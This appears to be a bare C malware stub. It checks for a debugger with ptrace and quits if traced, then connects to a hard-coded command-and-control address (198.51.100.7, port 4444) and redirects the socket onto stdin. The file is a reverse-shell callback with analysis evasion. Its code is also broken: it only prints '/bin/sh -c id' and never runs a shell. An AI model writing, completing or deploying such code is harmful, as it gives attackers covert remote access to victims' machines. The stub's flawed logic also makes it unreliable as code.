#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/ptrace.h>
static const char *C2 = "198.51.100.7";
int check(void){ return ptrace(PTRACE_TRACEME,0,0,0)==-1; }
int main(int argc,char**argv){ if(check()) return 1; int s=socket(AF_INET,SOCK_STREAM,0); struct sockaddr_in a={0}; a.sin_family=AF_INET; a.sin_port=htons(4444); inet_pton(AF_INET,C2,&a.sin_addr); if(connect(s,(struct sockaddr*)&a,sizeof a)==0){ dup2(s,0); } puts("/bin/sh -c id"); return 0; }
